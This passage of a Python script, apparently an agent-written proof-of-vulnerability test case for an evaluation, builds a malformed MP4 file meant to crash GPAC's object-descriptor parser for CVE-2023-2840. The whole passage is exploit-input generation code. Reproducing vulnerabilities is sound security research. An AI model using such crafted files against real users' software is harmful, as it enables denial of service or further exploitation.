am\n    data = struct.pack(\'>6B\', 0, 0, 0, 0, 0, 0)  # reserved\n    data += struct.pack(\'>H\', 1)  # data_reference_index\n    return write_box(b\'mp4s\', data)\n\ndef create_stsd():\n    """Create stsd box with OD sample entry"""\n    data = struct.pack(\'>I\', 0)  # version and flags\n    data += struct.pack(\'>I\', 1)  # entry_count\n    data += create_od_sample_entry()\n    return write_box(b\'stsd\', data)\n\ndef create_stts():\n    """Create stts box"""\n    data = struct.pack(\'>I\', 0)  # version and flags\n    data += struct.pack(\'>I\', 1)  # entry_count\n    data += struct.pack(\'>I\', 1)  # sample_count\n    data += struct.pack(\'>I\', 1000)  # sample_delta\n    return write_box(b\'stts\', data)\n\ndef create_stsc():\n    """Create stsc box"""\n    data = struct.pack(\'>I\', 0)  # version and flags\n    data += struct.pack(\'>I\', 1)  # entry_count\n    data += struct.pack(\'>I\', 1)  # first_chunk\n    data += struct.pack(\'>I\', 1)  # samples_per_chunk\n    data += struct.pack(\'>I\', 1)  # sample_description_index\n    return write_box(b\'stsc\', data)\n\ndef create_stsz(sample_sizes):\n    """Create stsz box"""\n    data = struct.pack(\'>I\', 0)  # version and flags\n    data += struct.pack(\'>I\', 0)  # sample_size (0 means different sizes)\n    data += struct.pack(\'>I\', len(sample_sizes))  # sample_count\n    for size in sample_sizes:\n        data += struct.pack(\'>I\', size)\n    return write_box(b\'stsz\', data)\n\ndef create_stco(chunk_offsets):\n    """Create stco box"""\n    data = struct.pack(\'>I\', 0)  # version and flags\n    data += struct.pack(\'>I\', len(chunk_offsets))  # entry_count\n    for offset in chunk_offsets:\n        data += struct.pack(\'>I\', offset)\n    return write_box(b\'stco\', data)\n\ndef create_stbl(sample_sizes, chunk_offsets):\n    """Create stbl box"""\n    data = create_stsd()\n    data += create_stts()\n    data += create_stsc()\n    data += create_stsz(sample_sizes)\n    data += create_stco(chunk_offsets)\n    return write_box(b\'stbl\', data)\n\ndef create_minf(sample_sizes, chunk_offsets):\n    """Create minf box"""\n    # nmhd for null media header (used for OD streams)\n    nmhd_data = struct.pack(\'>I\', 0)  # version and flags\n    nmhd = write_box(b\'nmhd\', nmhd_data)\n    \n    data = nmhd\n    data += create_dinf()\n    data += create_stbl(sample_sizes, chunk_offsets)\n    return write_box(b\'minf\', data)\n\ndef create_mdia(sample_sizes, chunk_offsets):\n    """Create mdia box with OD handler"""\n    data = create_mdhd()\n    data += create_hdlr(b\'odsm\')  # OD stream handler\n    data += create_minf(sample_sizes, chunk_offsets)\n    return write_box(b\'mdia\', data)\n\ndef create_trak(track_id, sample_sizes, chunk_offsets):\n    """Create trak box"""\n    data = create_tkhd(track_id)\n    data += create_mdia(sample_sizes, chunk_offsets)\n    return write_box(b\'trak\', data)\n\ndef create_moov(sample_sizes, chunk_offsets):\n    """Create moov box"""\n    data = create_mvhd()\n    data += create_trak(1, sample_sizes, chunk_offsets)\n    return write_box(b\'moov\', data)\n\ndef create_malformed_od_sample():\n    """\n    Create a malformed OD sample that will cause Media_ParseODFrame to fail.\n    The OD decoder expects valid OD commands but we\'ll provide invalid data.\n    \n    Key failure points in Media_ParseODFrame:\n    1. gf_odf_codec_decode() can fail on malformed data\n    2. Missing ESID in ESD descriptors (line 347-350)\n    3. Invalid descriptor tags\n    """\n    # Create an invalid OD command that will fail to decode\n    # OD Update command tag is 0x01, but we\'ll create malformed structure\n    # that causes decode failure\n    malformed_data = b\'\\x01\\x80\\x80\\x80\\xFF\'  # Invalid OD command structure\n    return malformed_data\n\ndef create_mdat(samples):\n    """Create mdat box"""\n    data = b\'\'\n    for sample in samples:\n        data += sample\n    return write_box(b\'mdat\', data)\n\ndef main():\n    output_path = \'/home/ubuntu/PoV/DrillAgent/eval/workspace-wo-exec-fb/gpac.cve-2023-2840/round1/testcase-round1\'\n    \n    # Create malformed OD sample\n    od_sample = create_malformed_od_sample()\n    samples = [od_sample]\n    sample_sizes = [len(s) for s in samples]\n    \n    # Calculate mdat offset (will be updated after we know moov size)\n    ftyp = create_ftyp()\n    moov = create_moov(sample_sizes, [0])  # temporary offset\n    \n    # Calculate actual mdat offset\n    mdat_offset = len(ftyp) + len(moov) + 8  # +8 for mdat header\n    \n    # Recreate moov with correct offset\n    moov = create_moov(sample_sizes, [mdat_offset])\n    \n    # Create mdat\n    mdat = create_mdat(samples)\n    \n    # Write complete MP4 file\n    with open(output_path, \'wb\') as f:\n        f.write(ftyp)\n        f.write(moov)\n        f.write(mdat)\n    \n    print(f"Generated malformed MP4 with OD track at: {output_path}")\n    print(f"Sample size: {len(od_sample)} bytes")\n    print(f"File size: {len(ftyp) + len(moov) + len(mdat)} bytes")\n\nif __name__ == \'__main__\':\n    main()\n'}


